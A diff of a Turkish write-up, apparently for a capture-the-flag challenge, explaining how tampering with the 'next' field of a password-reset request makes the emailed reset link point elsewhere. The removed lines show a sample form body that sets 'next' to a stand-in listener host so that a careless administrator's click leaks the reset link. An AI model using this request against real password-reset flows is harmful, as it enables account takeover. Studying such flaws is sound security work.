@@ -77,22 +77,6 @@ Ve gelen bağlantıdan şifre sıfırlama talebini başarıyla oluşturduğumuzd
 Yani kendimize gönderdiğimiz şifre sıfırlama isteğindeki 'next' alanını değiştirerek kendi e-postamıza gelen sıfırlama bağlantısını modifiye edebiliriz.
 
 
-Örneğin, isteğimizi aşağıdaki gibi düzenlersek:
-
-
-```formdata
-------WebKitFormBoundarym7tRlaLaR4ztC8jN
-Content-Disposition: form-data; name="username"
-
-kullanici_adi
-------WebKitFormBoundarym7tRlaLaR4ztC8jN
-Content-Disposition: form-data; name="next"
-
-http://xxxx.listener/
-------WebKitFormBoundarym7tRlaLaR4ztC8jN--
-```
-
-Verilen adrese yönlendirilecek bir bağlantı gönderilmiş olacak.
 
 
 Soru metni ve duyurulardaki bilgileri hatırlarsak, platform yöneticilerinin kendi e-posta kutularına gelen herhangi bir bağlantıya tıklayacak kadar bilinçsiz oldukları belirtilmişti.
